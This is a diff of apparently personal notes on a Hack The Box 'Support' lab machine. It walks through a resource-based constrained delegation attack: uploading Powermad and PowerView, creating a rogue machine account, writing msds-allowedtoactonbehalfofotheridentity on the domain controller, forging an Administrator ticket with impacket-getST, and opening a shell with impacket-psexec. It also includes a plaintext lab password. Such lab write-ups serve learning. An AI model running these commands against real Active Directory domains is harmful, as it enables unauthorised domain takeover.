@@ -289,12 +289,12 @@ crackmapexec winrm 10.10.11.174 -u 'support' -p 'Ironside47pleasure40Watchful'
 >![[Pasted image 20250225172951.png]]
 
 ### RBCD (resource based constrained delegation attack)
-- To perform this attack we are going to use [[rcbd.py]], more info [here](https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/resource-based-constrained-delegation.html#attack), first, we crate a computer object inside domaing using [[powermad]], so upload [[powermad]] and [[PowerView]] to the victim machine
+- To perform this attack we are going to use [[rcbd.py]] (as well we can use [[content/Tools/Rubeus.exe|Rubeus.exe]] like the example of hacktricks), more info [here](https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/resource-based-constrained-delegation.html#attack), first, we crate a computer object inside domaing using [[powermad]], so upload [[powermad]] and [[PowerView]] to the victim machine
 ```bash
 upload /home/jr117/Desktop/jr117/herramientas/Powermad
 upload /home/jr117/Desktop/jr117/herramientas/PowerTools/PowerView
 Import-Module ./Powermad/Powermad.ps1
-Import-Module ./PowerView/powerview.ps1
+Import-Module .\PowerView.ps1
 ```
 >[!example]- Result
 >![[Pasted image 20250225180025.png]]
@@ -307,4 +307,43 @@ New-MachineAccount -MachineAccount SERVICEA -Password $(ConvertTo-SecureString '
 >![[Pasted image 20250225180440.png]]
 
 >[!info]- we can check it using powerview
->
+>```powershell
+>Get-DomainComputer SERVICEA
+>```
+>![[Pasted image 20250225181658.png]]
+
+- Configure the object
+```powershell
+$ComputerSid = Get-DomainComputer SERVICEA -Properties objectsid | Select -Expand objectsid
+$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$ComputerSid)"
+$SDBytes = New-Object byte[] ($SD.BinaryLength)
+$SD.GetBinaryForm($SDBytes, 0)
+Get-DomainComputer DC | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}
+#Check that it worked
+Get-DomainComputer DC -Properties 'msds-allowedtoactonbehalfofotheridentity'
+```
+
+>[!example]- Result
+>![[Pasted image 20250225182637.png]]
+
+- now in our machine we can use [[impacket-getST]] 
+```bash
+impacket-getST -spn cifs/dc.support.htb -impersonate Administrator -dc-ip 10.10.11.174 support.htb/SERVICEA:123456
+```
+>[!example]- Result
+>![[Pasted image 20250225183808.png]]
+
+- We can use this `.ccache` to authenticate into the dc using [[impacket-psexec]]
+>[!Warning] We need to set this environment variable
+>```bash
+>export KRB5CCNAME=Administrator.ccache
+>```
+
+```bash
+impacket-psexec -k dc.support.htb
+```
+>[!example]- Result
+>![[Pasted image 20250225184515.png]]
+
+
+
